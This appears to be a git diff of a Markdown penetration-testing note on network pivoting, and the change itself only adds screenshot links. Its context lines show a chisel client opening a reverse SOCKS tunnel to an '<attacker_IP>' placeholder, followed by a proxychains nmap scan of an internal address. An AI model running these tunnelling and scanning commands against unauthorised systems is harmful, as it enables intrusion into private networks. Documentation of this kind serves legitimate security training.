@@ -26,6 +26,9 @@ chisel.exe client <attacker_IP>:<Local_listening_port> R:socks &
 ![image](https://user-images.githubusercontent.com/55615071/189031515-c4c54896-bd04-40c0-bc7b-43dc82c63afb.png)
 
 
+![image](https://user-images.githubusercontent.com/55615071/189064300-dc57330d-61dc-476b-b9cf-72afb1540b39.png)
+
+
 Remind : & on command is meaning run chisel on background
 
 After run chisel client, check state connect on chisel server. it should be like this
@@ -40,4 +43,4 @@ proxychains nmap -sT -Pn -sV -sC -p1-6000 192.168.239.129
 
 ![image](https://user-images.githubusercontent.com/55615071/189031936-dd2bbdcb-284d-4d58-abd8-e2cb0d3ddb9d.png)
 
-
+![image](https://user-images.githubusercontent.com/55615071/189064326-048fdaef-8772-4380-8714-d35c40d8442e.png)
